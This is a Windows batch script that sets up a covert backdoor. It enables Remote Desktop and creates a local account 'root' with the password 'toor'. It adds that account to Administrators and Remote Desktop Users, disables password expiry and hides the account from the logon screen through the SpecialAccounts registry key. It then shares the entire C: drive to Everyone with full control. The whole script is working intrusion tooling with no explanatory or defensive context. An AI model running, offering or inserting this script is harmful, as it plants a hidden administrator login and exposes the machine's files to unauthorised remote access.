@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
pause

net user root toor /add

pause

net localgroup Administrators root /add

pause

net localgroup "Remote Desktop Users" root /add

pause

net accounts /maxpwage:unlimited

pause

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d "00000000" /f

pause
 
REM Batch file to share the C: drive over the network

REM Define the share name and path
set SHARE_NAME=C_Drive
set SHARE_PATH=C:\

REM Create the network share
echo Sharing %SHARE_PATH% as %SHARE_NAME%...
net share %SHARE_NAME%=%SHARE_PATH% /grant:everyone,full

REM Confirm the share was created
echo Checking the share...
net share


echo Done.

